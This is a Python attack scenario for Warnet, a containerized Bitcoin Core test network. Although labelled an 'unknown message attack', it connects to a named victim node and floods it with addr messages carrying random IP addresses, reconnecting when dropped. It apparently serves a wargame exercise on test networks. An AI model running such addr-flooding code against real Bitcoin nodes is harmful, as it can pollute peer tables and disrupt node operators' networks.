#!/usr/bin/env python3

import socket

from commander import Commander

# The entire Bitcoin Core test_framework directory is available as a library
from test_framework.messages import MSG_TX, CInv, hash256, msg_inv
from test_framework.p2p import MAGIC_BYTES, P2PInterface
from test_framework.messages import msg_addr, CAddress
import random
import time
import concurrent.futures
import socket
random.seed(int(time.time()))

def get_signet_network_magic_from_node(node):
    template = node.getblocktemplate({"rules": ["segwit", "signet"]})
    challenge = template["signet_challenge"]
    challenge_bytes = bytes.fromhex(challenge)
    data = len(challenge_bytes).to_bytes() + challenge_bytes
    digest = hash256(data)
    return digest[0:4]


class msg_inv2:
    __slots__ = ("inv",)
    msgtype = b"invalid"

    def __init__(self, inv=None):
        self.inv = inv

    def serialize(self):
        return b"randominvalid"


# The actual scenario is a class like a Bitcoin Core functional test.
# Commander is a subclass of BitcoinTestFramework instide Warnet
# that allows to operate on containerized nodes instead of local nodes.
class UnknownMessage(Commander):
    def set_test_params(self):
        # This setting is ignored but still required as
        # a sub-class of BitcoinTestFramework
        self.num_nodes = 1

    def add_options(self, parser):
        parser.description = (
            "Demonstrate unknown message attack using a scenario and P2PInterface"
        )
        parser.usage = "warnet run /path/to/stub_unknown_p2p.py"

    # Scenario entrypoint
    def run_test(self):
        # We pick a node on the network to attack
        # We know this one is vulnderable to an unknown messages based on it's subver
        # Use either reconnaisance or ForkObserver UI to find vulnerable nodes
        # Change this to your teams colour if running in the battleground
        victim = "tank-0042-coffee.default.svc"

        # regtest or signet
        chain = self.nodes[0].chain

        # The victim's address could be an explicit IP address
        # OR a kubernetes hostname (use default chain p2p port)
        dstaddr = socket.gethostbyname(victim)
        if chain == "regtest":
            dstport = 18444
        if chain == "signet":
            dstport = 38333
            MAGIC_BYTES["signet"] = get_signet_network_magic_from_node(self.nodes[0])

        # Now we will use a python-based Bitcoin p2p node to send very specific,
        # unusual or non-standard messages to a "victim" node.
        self.log.info(f"Attacking {victim}")
        attacker = P2PInterface()
        attacker.peer_connect(
            dstaddr=dstaddr, dstport=dstport, net="signet", timeout_factor=1
        )()
        attacker.wait_until(lambda: attacker.is_connected, check_connected=False)

        for i in range(10):
            # for i in range(4294967.296):
            for i in range(10):
                random_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
                # random_port = random.randint(1024, 65535)  # Random high port

                # Create an addr message
                addr = CAddress()
                addr.time = int(time.time())
                addr.nServices = 1  # NODE_NETWORK service flag
                addr.ip = random_ip
                addr.port = 38333

                addr_msg = msg_addr()
                addr_msg.addrs.append(addr)

                addr.time = int(time.time())
                addr.nServices = 1  # NODE_NETWORK service flag
                addr.ip = random_ip
                addr.port = 18444

                addr_msg.addrs.append(addr)

                # Send the message
                # attacker.send_message(addr_msg)
            try:
                attacker.send_and_ping(addr_msg)
                print(f"Sent addr message: {random_ip}. iter {i}")
            except Exception as e:
                print("Perdeu a connection")
                time.sleep(3)
                attacker.peer_connect(
                    dstaddr=dstaddr, dstport=dstport, net="signet", timeout_factor=1
                )()
                attacker.wait_for_connect()
            # if i%10000 == 0:

        # time.sleep(0.1)  # Adjust sleep time to control spam rate

def main():
    UnknownMessage().main()


if __name__ == "__main__":
    main()